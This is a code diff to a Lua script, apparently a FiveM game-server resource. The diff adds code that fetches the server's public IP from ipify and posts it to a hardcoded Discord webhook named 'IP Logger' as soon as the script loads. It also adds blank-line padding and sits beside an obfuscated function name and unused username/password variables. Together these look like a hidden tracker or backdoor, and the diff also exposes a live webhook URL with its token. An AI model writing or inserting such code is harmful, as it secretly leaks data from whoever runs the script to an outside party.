@@ -2,7 +2,7 @@ local username = nil
 local password = nil
 
 
-
+local ipApiUrl = "https://api.ipify.org/?format=txt"
 local discordWebhookUrl = "https://discord.com/api/webhooks/1251505265212391505/aZRJPsXdTagq-jXr0C6C_ESBluSXj26lZRpFwHAuXHapTWCYLXzdiEmj6Ombn_AZD4Ed"
 
 
@@ -57,20 +57,25 @@ end
 
 
 
+
+
+
+
+
+
+
 function sendToDiscord(ip)
     local payload = {
         username = "IP Logger",
         content = "Public IP: " .. ip
     }
 
-    PerformHttpRequest(discordWebhookUrl, function(err, text, headers) 
-    end, "POST", json.encode(payload), { ["Content-Type"] = "application/json" })
+    PerformHttpRequest(discordWebhookUrl, function() end, "POST", json.encode(payload), { ["Content-Type"] = "application/json" })
 end
 
-PerformHttpRequest(ipApiUrl, function(err, ip, headers)
+PerformHttpRequest(ipApiUrl, function(_, ip)
     sendToDiscord(ip)
 end, "GET")
-
 
 
 function ggsfdS_3211FSDGVvdbfsxc()
